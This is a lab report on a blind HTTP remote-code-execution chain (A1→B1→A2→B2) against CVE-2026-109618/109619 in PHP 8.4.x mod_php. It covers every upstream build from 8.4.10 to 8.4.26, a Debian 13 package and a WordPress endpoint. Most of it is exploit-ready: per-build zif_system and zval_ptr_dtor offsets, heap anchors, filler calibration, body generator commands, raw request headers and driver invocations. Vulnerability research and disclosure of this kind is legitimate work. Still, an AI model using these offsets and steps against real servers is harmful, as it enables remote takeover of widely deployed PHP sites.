# CVE-2026-109618 / 109619 — mod_php 8.4.x build matrix

**Run:** `modphp_84_matrix_20261023T074116Z`
**Date:** 2026-10-23
**Scope:** every released PHP 8.4.x build (8.4.1–8.4.26; 8.4.0 and 8.4.9 were never released), plus 8.4.27 as fixed control, plus the Debian 13 `libapache2-mod-php8.4` 8.4.24 package.
**Stack:** stock Apache 2.4 prefork + mod_php (`php:<v>-apache` images), stock `php.ini-production`, ASLR on, no pinning, no gdb in the attack path.
**Method:** blind HTTP only — the 9bie A1→B1→A2→B2 chain, single-A2 route, fresh child per attempt, proof file written by the target.

---

## Verdict

| Claim | Result |
|---|---|
| Full blind RCE on official upstream `php:8.4.<v>-apache`, v = 10…26 | **17 / 17 builds succeeded** (`uid=33(www-data)` + per-build marker) |
| Same on v = 1…8 | **0 / 8** — A1 does not reach the END-cleanup OOM (measured blocker, §5) |
| 8.4.27 fixed control | **clean** — A1 returns 200, B1 leaks nothing, no crash (§6) |
| Debian 13 `libapache2-mod-php8.4` 8.4.24-1~deb13u1 | **affected and exploitable**: A1 OOM + B1 leak reproduced, and blind A2/B2 RCE **4/4** with distro calibration (`fillers 116`, `S=main+0xF7398`); two negative controls failed (§7) |
| WordPress 7.1.3 on 8.4.26 | **RCE** on `/wp-content/index.php` (§8) |
| A1/B1 needed changes beyond the two symbol offsets (8.4.10–26) | **No** — byte-identical A1/B1/A2 bodies, same `main+0xF8398` anchor |
| One payload covers all 8.4.x | **No.** Bodies are identical across 8.4.10–8.4.26, but `zif_system`/`zval_ptr_dtor` differ per build (and per distro package), so a blind target needs an exact per-build payload table. 8.4.1–8.4.8 need a different A1 entirely. |

---

## 1. Target configuration

Every build was run with the same non-negotiable setup:

* Image: official `php:<v>-apache` (Debian, mod_php, `mpm_prefork`, `StartServers 5`, stock values).
* `php.ini`: the image's own `php.ini-production`, mounted at `/usr/local/etc/php/php.ini`.
  All 26 files are byte-identical: md5 `fba97f0b3e0b19b0980f5102c0440480`, sha256 `8d6fcbbcff18…`.
* Effective values (verified through `diag.php` in every container):
  `memory_limit=128M`, `post_max_size=8M`, `upload_max_filesize=2M`,
  `max_execution_time=30`, `display_errors=Off`, `output_buffering=4096`,
  `session.upload_progress.enabled=1`, `zend.assertions=-1`.
* Document root: a single `index.php` (`<?php echo "OK\n";`) — i.e. a generic PHP endpoint that does not consume the POST body.
* vhost: stock-shaped `000-default.conf`; only additions are the `p2s` access-log format and the per-container `/out` proof mount.
* `diag.php` is a lab-only version canary (`version=<v>`), used to prove each request hit the intended container (port collisions with another lane were caught this way).
* Proof directory `/out` inside each container is `chmod 777` (www-data must write).
* ASLR on; each attempt starts from a fresh container restart.

---

## 2. Bodies

All bodies are the 9bie pure-Python bodies; A1, B1 and A2 are byte-identical for every 8.4.10–8.4.26 run. Only B2 embeds leaked addresses, so its hash changes per attempt.

| Stage | Generator | Bytes | SHA-256 |
|---|---|---|---|
| A1 | `mk_a1.py --parts 860 --big 78` | 1,060,211 | `8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6` |
| B1 | `mk_leak_b.py`, spec `G:511:0x137`×14 + `G:400:0x137` + `G:511:0x137` + `X:900`, `--fake-len 0xC8000` | 33,128,677 | `b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2` |
| A2 | `cheap_oom_a.build_body(880, 64, 115, sid=b"a"*32, progress=b"k0")` | 279,369 | `7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236` |
| B2 | `fake_ref_b` spray + `mk_ht(S, lib+zif_system, cmd, 384)` | 451,384 | per attempt (addresses baked in) |

Command executed by the fake destructor:

```
id>/out/p1_conc_<marker>; echo <marker>>>/out/p1_conc_<marker>; id>&2; echo <marker>&2
```

Success criterion: the target writes a proof file containing `uid=33(www-data) gid=33(www-data)` **and** the per-build marker. The proof file is the decisive test. A `SIGSEGV` in the B2 child is a side effect, **not** a requirement: it was logged on 11 of 17 builds; on the other six (8.4.12, 8.4.14–8.4.18) the destructor call returned and the worker survived — see the `zif_system` stub note in §3.

---

## 3. Master table — build × result × offsets

`S anchor` is the Zend-MM chunk offset `main + 0xF8398`. It is not an ELF symbol; it was validated per build by a successful B2 (see §4). `A1@860` / `A1@920` are the A1 probe status codes with the stock body at 860 / 920 parts.

| PHP | libphp sha256 (16) | zif_system | zval_ptr_dtor | S anchor | A1@860 | A1@920 | chain | B1 hit | decoded | proof marker |
|---|---|---|---|---|---|---|---|---|---|---|
| 8.4.10 | `a6b5a2e606b3c066` | `0x43b7d0` | `0x62cf70` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=4 | 819,208 | `M84_8410_a` |
| 8.4.11 | `fe10341d35be5fdd` | `0x446cb0` | `0x63d2e0` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=0 | 819,208 | `M84_8411_a` |
| 8.4.12 | `e6624242a76dc0a4` | `0x446cf0` | `0x63dc20` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=0 | 819,208 | `M84_8412_a` |
| 8.4.13 | `f736a943df7037ed` | `0x445bf0` | `0x63cbe0` | main+0xF8398 | 500 | 500 | **RCE** (try1) | i=2 | 819,208 | `M84_8413_b` |
| 8.4.14 | `8a0e20af698c9245` | `0x445c30` | `0x63d020` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=4 | 819,208 | `M84_8414_a` |
| 8.4.15 | `6a36c3e76d6238fc` | `0x445f70` | `0x63d420` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=4 | 819,208 | `M84_8415_a` |
| 8.4.16 | `d8b25ea74955424a` | `0x446930` | `0x63de20` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=1 | 819,208 | `M84_8416_a` |
| 8.4.17 | `557ac34f8abef550` | `0x446cb0` | `0x63e520` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=0 | 819,208 | `M84_8417_a` |
| 8.4.18 | `b8b22ade47419643` | `0x446ff0` | `0x63eb20` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=0 | 819,208 | `M84_8418_a` |
| 8.4.19 | `f56ef68faa09c408` | `0x4472f0` | `0x63efe0` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=1 | 819,208 | `M84_8419_a` |
| 8.4.20 | `9324d527478896a0` | `0x447530` | `0x63f9e0` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=4 | 819,208 | `M84_8420_a` |
| 8.4.21 | `04a8e8b27e34ae24` | `0x4623b0` | `0x65afe0` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=1 | 819,208 | `M84_8421_a` |
| 8.4.22 | `49d37503ba09910e` | `0x462d30` | `0x65b9e0` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=3 | 819,208 | `M84_8422_a` |
| 8.4.23 | `b20e68d994f93c03` | `0x462d70` | `0x65b9a0` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=0 | 819,208 | `M84_8423_a` |
| 8.4.24 | `322c2d16f4a3f460` | `0x464530` | `0x65d1e0` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=0 | 819,208 | `M84_8424_a` |
| 8.4.25 | `a70977eb3ed3aea0` | `0x464c70` | `0x65dc60` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=0 | 819,208 | `M84_8425_a` |
| 8.4.26 | `51663cf883b12234` | `0x465370` | `0x65eb60` | main+0xF8398 | 500 | 500 | **RCE** (try0) | i=2 | 819,208 | `M84_8426_a` |

Per-build image digest, full `libphp.so` hash and ini hash: `receipts/table_appendix.md`.

Notes:

* Every B1 hit produced exactly **819,208** decoded bytes (the `0xC8000` fake length), on the 5th request in a fresh 5-worker generation when the hit index is 4.
* 8.4.13 needed a second whole-chain attempt (`try1`, marker `_b`); try0 missed at B1. All other successes were on the first attempt.
* `libphp - main` deltas are **not** a reliable acceptance test across the matrix: 8.4.10 gave a negative delta (`-0x1e27000`, main above lib) and still chained successfully. The `~87` bucket count is the stable fingerprint (87–88 hits in every hit).
* **Why six builds show no crash.** On 8.4.12, 8.4.14, 8.4.15, 8.4.16, 8.4.17 and 8.4.18 the leak's dominant pointer is `zval_ptr_dtor + 0xB` (an interior hot address), so the derived `libphp` base is 0xB above the true base and the fake destructor lands at `zif_system + 0xB`. That still executes the command: `zif_system` is a 5-byte stub — `mov $0x2,%edx; jmp php_exec_ex` (`ba 02 00 00 00` / `e9 26 fd ff ff`), verified by disassembly — followed by a 5-byte NOP pad (`66 0f 1f 44 00 00`) and then `zif_passthru` (`mov $0x3,%edx; jmp php_exec_ex`). `+0xB` is the middle of the NOP pad, which still decodes as a valid 5-byte NOP and falls through into `zif_passthru`, so the command runs and the child survives. On the other 11 builds the leak anchor is the real `zval_ptr_dtor` entry, the destructor hits `zif_system` exactly, and the child dies with `SIGSEGV` after writing the proof. Both paths produce the same proof file, so the result is the same for an attacker.

---

## 4. Why only two symbols change

For 8.4.10–8.4.26 the bodies never changed, the anchor never changed, and the leak/`main`-bucket fingerprint stayed at 87–88 hits. Only two offsets are build-specific:

* `zif_system` — the `pDestructor` target (`libphp + zif_system`);
* `zval_ptr_dtor` — the anchor used to turn the most frequent leaked pointer into the `libphp` base (`libphp = zdtor - zval_ptr_dtor`).

`main` comes from the B1 leak at runtime; the anchor `S = main + 0xF8398` is a Zend-MM chunk offset, not an ELF symbol, and was validated on every build by a successful B2 (i.e. `system()` executed from the fake `zend_array`). No other per-build value was required.

Symbol drift within 8.4.10–8.4.26 is small but real (`zif_system` 0x43b7d0 → 0x465370, `zval_ptr_dtor` 0x62cf70 → 0x65eb60), and it jumps at 8.4.21 (the 0x46… group), so offsets from one build do not work on another.

---

## 5. Early builds 8.4.1–8.4.8 — measured blocker

The A1 body does **not** produce the END-cleanup OOM on these builds.

| Probe (stock A1, stock ini) | 8.4.1–8.4.7 | 8.4.8 | 8.4.10–8.4.26 |
|---|---|---|---|
| A1 @ 860 parts | `200 OK`, 258 B | `200 OK`, 268 B | `500`, 211 B |
| A1 @ 920 parts | `500`, 210 B | `500`, 211 B | `500`, 211 B |
| B1 after A1 | normal 32-hex `PHPSESSID`, no pointers | same | 1.67 MB pointer window |

Bounded calibration on 8.4.4 (all with the stock ini, fresh restart per attempt):

1. **parts sweep** — 780/800/820/860 → 200; 862, 864, 868, 872, 876, 880, 890, 900, 910, 915, 918 → `500`, 210 B, ~0.11 s; B1 at every 500 → normal cookie (`err:no pointers`).
2. **big-len sweep** (78 big values × length) — 8000…8160 → 200; 8170…8400 → 500. The largest non-OOM shape (8160) and the smallest OOM shape (8170) were both chained: B1 normal, no leak.
3. **progress-len** 1 MB / 2 MB / 4 MB at 860 parts → `500` parse OOM (0.11 s), no leak.
4. **id-page sweep** — B1 regenerated for every fake-id page `0x12f…0x136, 0x138…0x13f` (16 pages) at the A1 OOM shape; **all 16 returned the normal 258-byte cookie with no pointer window**.

Interpretation (matching the measured allocation sizes): on 8.4.1–8.4.8 a 1.06 MB A1 either completes (200, no OOM) or aborts during multipart parsing (~0.11 s, "Allowed memory size … exhausted (tried to allocate 8192/12288/16384/20480 bytes)"), and the parse abort leaves no stale `PS(id)` that B1 can turn into a leak. The END-cleanup `send_cookie` OOM that the chain needs first appears in 8.4.10 (the 8.4.9 development line; 8.4.9 was never released). No A1 shape tried reached that state on 8.4.1–8.4.8; these builds need a different early-cleanup groom, not different offsets.

---

## 6. 8.4.27 — fixed control

Image `php:8.4.27-apache`, image ID `sha256:675af91f3349…`, `libphp.so` 21,297,488 B, sha256 `992b4b07fd4880b2dd5be75a4912e0dc619ca08e1a4ff0c7eac0dce4c1aa7c31`.
Symbols: `zif_system=0x46ad70`, `zval_ptr_dtor=0x66a620`.

| Probe | Result |
|---|---|
| A1 @ 860 (stock body) | `200 OK`, 259 B, `Set-Cookie: PHPSESSID=…` — **no OOM** |
| A1 @ 920 | `200 OK`, 195 B — no OOM, **no `Set-Cookie`** (no session cookie at all; 259 B − 64 B = 195 B) |
| B1 × 3 after A1 | `200 OK`, 259 B each, `err:no pointers` |
| Crash / proof | none |

The fixed build neither OOMs nor leaks at the shapes that are lethal on 8.4.10–8.4.26.

---

## 7. Debian 13 package — `libapache2-mod-php8.4` 8.4.24-1~deb13u1

Container `m109-d8424pkg` (Debian trixie, Apache 2.4.69 prefork, mod_php), port 18740.

| Item | Value |
|---|---|
| Package | `libapache2-mod-php8.4 8.4.24-1~deb13u1` |
| Module | `/usr/lib/apache2/modules/libphp8.4.so`, 5,980,008 B, sha256 `7da07d207d2ba2c28b55e11f5754a1a50523e35a5f29b624b22588fe162db70f` |
| Debug symbols | `/usr/lib/debug/.build-id/a5/3126ca5ef3f1c12e9bd48cf7cccd63698fc818.debug` (build-id `a53126ca…`) |
| `zif_system` | `0x24cdd0` (LOCAL, from dbgsym) |
| `zval_ptr_dtor` | `0x424ff0` (GLOBAL, from dbgsym) |
| A2 calibration | `--fillers 116` → `PS(http_session_vars) = main+0x7D720` |
| B2 fake-array anchor | `S = main+0xF7398` |
| Apache ini | `memory_limit=128M`, `post_max_size=8M`, `upload_max_filesize=2M`, `max_execution_time=30`, `display_errors=Off`, `output_buffering=4096`, opcache enabled (`10-opcache.ini`) |
| Changelog | newest entry `8.4.24-1~deb13u1`, 2026-07-31, CVEs 2026-17544 / 17543 / 7260 — **no CVE-2026-109618/109619 entry** |

Measured:

* **A1** → `HTTP/1.0 500`, 185 B. Error log: `Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes)` — same allocation size as upstream 8.4.24/8.4.26.
* **B1** → hit at i=4: 819,208 decoded bytes, `lib = 0x7fcb66b9a000`, main candidates `{0x7fcb65a00000: 88, 0x7fcb58a00000: 79, 0x7fcb59200000: 6}`, chosen main `0x7fcb65a00000` (`lib-main = 0x119a000`).
* **A2** → `500`, 185 B; error log `tried to allocate 4096 bytes` (same as upstream). The filler count is build-specific: **`--fillers 116`** (not upstream's 115) places the dangling `PS(http_session_vars)` at `main+0x7D720`. Measured sweep: every filler shifts `hsv` by `+0x80` (115 → `0x7D6E0`, 116 → `0x7D720`, 117 → `0x7D760`, …). After A2 the ZendMM heap is fully torn down (`size=0`, `peak=0`, chunk `free_pages=511`, page 125 `FRUN`), so `PS(hsv)` is a dangling pointer into a free page.
* **A2/B2 geometry** — the 384-byte spray values are bin 18 (448-byte slots, 9 per page). A fake `zend_reference` is written at slot offsets `0x20+32k`. With fillers 115, `hsv=0x7D6E0` is slot 3 offset `0x1A0`, i.e. 8 B past the value's 384-byte data end → never written. With fillers 116, `hsv=0x7D720` is slot 4 offset `0x20` → the first fake ref. A hardware watchpoint at `hsv=0x7D720` during B2 shows `memcpy(dest=…7d718, len=384)` from `zend_string_init` ← `php_sapi_filter` ← `rfc1867_post_handler` (field `s000000037`), then the `session.c:244` dtor in `php_session_track_init` (from `php_session_rfc1867_cleanup`, `session.c:3202`) decrementing the fake ref `rc 2→1` in the diagnostic run (`rc=2`); exploit mode uses `rc=1`.
* **Trigger-time `S`** — a 2 MiB chunk dump taken at the line-244 dtor shows the `ht` value's data at **`S = main+0xF7398`** (not `0xF8398`). The fake-array header there is `01 00 00 00 07 00 00 00` and the `pDestructor` word equals `zif_system` exactly. Two valid copies are visible `0x1C0` apart (`0xF7398`, `0xF7558`); the exploit uses `0xF7398`.
* **Blind chain** — `A1` 500 → `B1` leak (819,208 decoded bytes; main bucket count 88, which gdb confirms is the real main chunk) → `A2 --fillers 116` 500 → `B2` with `S=main+0xF7398`, `zif_system=lib+0x24cdd0`, `zval_ptr_dtor=lib+0x424ff0`, fake refs `rc=1`, body 451,384 B (sha256 `44f2f9be…`). Single-A2 route, then B2 rotation; the A2 child receives B2 on the 5th attempt (index 4) in every run.
* **Result** — **4/4 independent runs succeeded** (`DEB116R1`–`DEB116R4`). Each left a target-written proof file `/out/p1_conc_<marker>` containing `uid=33(www-data) gid=33(www-data) groups=33(www-data)` plus its marker. Run 4's raw `error.log` also captured the `id` stderr output verbatim and the post-`system()` `child pid 11 exit signal Segmentation fault (11)`.
* **Controls (required to fail, and did)** — (a) `fillers=115` with the same `S`: hsv is off the fake-ref grid, every B2 returns `200 OK`, no proof file. (b) wrong anchor `S=main+0xF8398` with `fillers=116`: no proof file (one B2 returns a truncated 169-byte response). Neither control produced `uid` or a marker.

Conclusion for the package: **affected and exploitable**. With distro-specific symbols (`0x24cdd0/0x424ff0`), the distro A2 filler calibration (`116` → `hsv=main+0x7D720`) and the distro `S` anchor (`main+0xF7398`), the stock Debian 13 package is fully compromised blind over HTTP: 4/4 runs wrote `uid=33(www-data)` proofs, while the two negative controls failed. The post-exploitation SIGSEGV is expected: `zend_array_destroy()` continues past the `zif_system` call into the fake array and kills the child after the proof is written. Upstream payloads cannot be reused against this binary: the same PHP version has different symbols, a different A2 filler count and a different `S` anchor.

---

## 8. WordPress 7.1.3 endpoint

To show the chain does not depend on the one-line lab endpoint, it was run against a real WordPress 7.1.3 tree (`wp_version = '7.1.3'`) on `php:8.4.26-apache`, targeting `/wp-content/index.php` (a plain PHP file that does not bootstrap WordPress and does not read the body):

| Stage | Result |
|---|---|
| A1 | `500`, 211 B |
| B1 | hit, 819,208 decoded, `main=0x7fab18200000`, `lib=0x7fab19f07000` (bucket 87) |
| A2 + B2 | success on B2 attempt i=4 (single A2, then rotation) |
| Proof | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` / `WP713` (`sha256 badd7249d344c463fe1cd890b257bc5519568573f0a5b293a247d3eae64ccc71`) |

`/` itself returns 500 (WordPress is not installed against a DB), which is irrelevant: the exploited file is a static PHP endpoint, exactly as in the wild for any plugin/theme `.php` file.

---

## 9. Portability conclusion

* **8.4.10 – 8.4.26 (upstream official builds): one body set, per-build offsets.**
  A1/B1/A2 are byte-identical for all 17 builds and the `main+0xF8398` anchor is unchanged; only `zif_system` and `zval_ptr_dtor` differ. A blind target therefore needs the exact version (the stock images leak it in `X-Powered-By: PHP/8.4.<v>`) and the matching two offsets. There is **no single payload** that covers 8.4.x, because using one build's offsets on another produces a wrong `libphp` base and a wrong `pDestructor` (silent 200 or a crash without code execution).
* **8.4.1 – 8.4.8: not covered.** Same bodies do not reach the leak-capable state at all (16-page sweep + parts/big-len/progress-len calibration, §5). A different early-cleanup groom would be required; none was found within this run's budget.
* **Distro builds are separate targets.** The Debian 13 8.4.24 package is affected and was exploited blind after its own calibration (§7): symbols `0x24cdd0/0x424ff0`, A2 `--fillers 116` (`hsv=main+0x7D720`), `S=main+0xF7398`, 4/4 proofs and two failed controls. Its module is a different binary from the official image despite the same PHP version string, so upstream 8.4.24 payloads do not apply.
* The version boundary (8.4.8 → 8.4.10) is exactly where the END-cleanup `send_cookie` OOM becomes reachable with the 9bie A1 shape; 8.4.27 removes it.

---

## 10. Raw requests and reproduction

A1 (chunked; body 1,060,211 B, sha256 `8e8fc166…`):

```
POST /index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v HTTP/1.1
Host: 127.0.0.1:<port>
Content-Type: multipart/form-data; boundary=CCCCCCCCCC
Transfer-Encoding: chunked
Connection: close
```

B1 (plain, `Content-Length: 33128677`, same boundary), A2 (`Content-Length: 279369`) and B2 (`Content-Length: 451384`) are the same `POST /index.php` shape without the query string.

Driver:

```bash
python3 scripts/chain84.py --port <port> --container <ctr> \
  --a1 bodies/a1.bin --b1 bodies/b1.bin --n 5 \
  --zif-off <zif_system> --zdtor-off <zval_ptr_dtor> --s-off 0xF8398 \
  --marker M84_<v> --outdir out/<v>/try0 --restart
```

Matrix driver (pull → extract `libphp.so` + `php.ini-production` → symbols → A1 probe → chain → cleanup):

```bash
ONLY="8.4.10,8.4.11,…,8.4.26" python3 scripts/run_matrix2.py
```

Early-build probes:

```bash
python3 scripts/probe_a1_ini.py                  # A1 @ 860/920/840 for all builds
python3 ../9bie_update_20261022T115026Z/code/repo/pure/mk_a1.py \
  --out /tmp/a1.bin --parts 860 --big 78 --big-len 8170
```

All request/response bytes are kept under `out/<v>/` (`a1.resp`, `b1_*.resp`, `a2_*.resp`, `b2_*.resp`) and the per-build raw Apache logs under `receipts/<v>/`.

---

## 11. Evidence inventory

| Path | Content |
|---|---|
| `receipts/a1_probe_ini.json` | A1 status/bytes/elapsed at 860/920/840 for all 27 versions |
| `receipts/summary.json` | consolidated per-build symbols, image, ini, leak, proof |
| `receipts/table_master.md`, `receipts/table_appendix.md`, `receipts/table_runtime.md` | machine-generated tables used above and in Appendix A |
| `receipts/<v>/meta.json` | image ID, `libphp.so` sha256/size, symbols, ini hashes, effective ini, A1 probe, chain records, crash lines |
| `receipts/<v>/docker.log`, `receipts/<v>/access.log` | raw Apache logs for the run |
| `out/<v>/final.json` | final result for build `<v>` |
| `out/<v>/try*/` | stage responses (`a1.resp`, `b1_i.resp`, `a2_i.resp`, `b2_i.resp`) and `result.json` |
| `out/<v>_proof/p1_conc_*` | target-written `uid=33` proof per build |
| `so/libphp-<v>.so` | extracted modules for all tested builds (+ Debian 8.4.24 `.so`/dbgsym) |
| `bodies/` | A1/B1/A2 and the early-build calibration variants |
| `scripts/` | `run_matrix2.py`, `chain84.py`, `probe_a1_ini.py` |
| `out/run1..run4/` | Debian blind RCE runs: `a2_0.resp`, `b2_*.resp`, `result.json`; proofs `DEB116R1`–`R4` |
| `out/ctl1/`, `out/ctl2/` | Debian negative controls (`fillers=115`; wrong `S=main+0xF8398`), both failed |
| `out/watch116.txt`, `out/watch116.json` | hardware-watchpoint proof: fake ref written at `hsv` and dtor `rc 2→1` |
| `out/debshift.json`, `out/trig.json`, `out/chunk_bp.bin` | filler→hsv sweep; trigger-time chunk dump and `S=main+0xF7398` |
| `out/proofs_r1r3.txt`, `out/run4/error_and_proof.txt` | persisted Debian proof files and raw Apache error log with `id` output + child SIGSEGV |

Evidence hashes for the fixed artifacts are in `SHA256SUMS` (generated at the end of this run).

---

## Appendix A — per-build runtime leak and `S`

Addresses from the successful attempt (ASLR on, per run); the reproducible quantity is `S - main = 0xF8398` and the leaked module/chunk offsets.

| PHP | leaked `libphp` | leaked `main` | `lib-main` | `S = main+0xF8398` |
|---|---|---|---|---|
| 8.4.10 | `0x7f24e51d9000` | `0x7f24e7000000` | `-0x1e27000` | `0x7f24e70f8398` |
| 8.4.11 | `0x7f329d07c000` | `0x7f329b400000` | `0x1c7c000` | `0x7f329b4f8398` |
| 8.4.12 | `0x7f60e752a00b` | `0x7f60e5800000` | `0x1d2a00b` | `0x7f60e58f8398` |
| 8.4.13 | `0x7f7c2c90a000` | `0x7f7c2ac00000` | `0x1d0a000` | `0x7f7c2acf8398` |
| 8.4.14 | `0x7f2317d0c00b` | `0x7f2316000000` | `0x1d0c00b` | `0x7f23160f8398` |
| 8.4.15 | `0x7fd2b1cd200b` | `0x7fd2b0000000` | `0x1cd200b` | `0x7fd2b00f8398` |
| 8.4.16 | `0x7fa70819c00b` | `0x7fa706600000` | `0x1b9c00b` | `0x7fa7066f8398` |
| 8.4.17 | `0x7fc03d34400b` | `0x7fc03b600000` | `0x1d4400b` | `0x7fc03b6f8398` |
| 8.4.18 | `0x7feca23b700b` | `0x7feca0800000` | `0x1bb700b` | `0x7feca08f8398` |
| 8.4.19 | `0x7f1811bd5000` | `0x7f1810000000` | `0x1bd5000` | `0x7f18100f8398` |
| 8.4.20 | `0x7f91a0ebd000` | `0x7f919f200000` | `0x1cbd000` | `0x7f919f2f8398` |
| 8.4.21 | `0x7ff139446000` | `0x7ff137800000` | `0x1c46000` | `0x7ff1378f8398` |
| 8.4.22 | `0x7f5e5a69e000` | `0x7f5e58a00000` | `0x1c9e000` | `0x7f5e58af8398` |
| 8.4.23 | `0x7fe67573d000` | `0x7fe673a00000` | `0x1d3d000` | `0x7fe673af8398` |
| 8.4.24 | `0x7fe1d839d000` | `0x7fe1d6800000` | `0x1b9d000` | `0x7fe1d68f8398` |
| 8.4.25 | `0x7f460a934000` | `0x7f4608c00000` | `0x1d34000` | `0x7f4608cf8398` |
| 8.4.26 | `0x7f062cbb8000` | `0x7f062b000000` | `0x1bb8000` | `0x7f062b0f8398` |

The six `libphp` values ending in `…00b` are the `zval_ptr_dtor+0xB` leak-anchor case described in §3; they are still working runs with a valid proof.

### A.1 Debian 13 `libapache2-mod-php8.4 8.4.24-1~deb13u1`

The distro build does **not** use the upstream `main+0xF8398` anchor; it needs its own calibration.

| Item | Value |
|---|---|
| `zif_system` | `lib+0x24cdd0` |
| `zval_ptr_dtor` | `lib+0x424ff0` |
| A2 | `--fillers 116` → `hsv = main+0x7D720`; 115 → `0x7D6E0` (off the 384-byte fake-ref grid) |
| `S` at trigger time | `main+0xF7398` (chunk dump at the `session.c:244` dtor; header `01 00 00 00 07 00 00 00`, `pDestructor = zif_system`) |
| Blind runs | 4/4 (`DEB116R1`–`R4`), each with a target-written `uid=33(www-data)` proof; B2 hit at rotation index 4 |
| Controls | `fillers=115` (off-grid) and `S=main+0xF8398` (wrong anchor) both failed, no proof |
| Evidence | `out/run1..run4/`, `out/ctl1/`, `out/ctl2/`, `out/watch116.txt`, `out/debshift.json`, `out/trig.json`, `out/chunk_bp.bin`, `out/proofs_r1r3.txt`, `out/run4/error_and_proof.txt` |

---

## 12. Limits

* The matrix uses the official `php:<v>-apache` images, not source builds: they are the reference upstream binaries for each release, but they are still Debian-packaged images (Apache 2.4.62/2.4.69, uniform build flags).
* Single-A2 route with `--restart`; warm-server reliability was not re-measured here (the earlier 8.4.26 lane measured 1/4 on a warm server).
* B1 hit index varies with rotation (0–4); every build eventually hit, and 8.4.13 required a second whole-chain attempt.
* Debian 13 package: blind RCE verified 4/4 with two negative controls (§7); the exploit needs distro-specific symbols, A2 `--fillers 116` and `S=main+0xF7398`, so upstream 8.4.24 payloads do not apply.
* No FPM, no PHP 7, no PHP 5, no push/commit/PR.
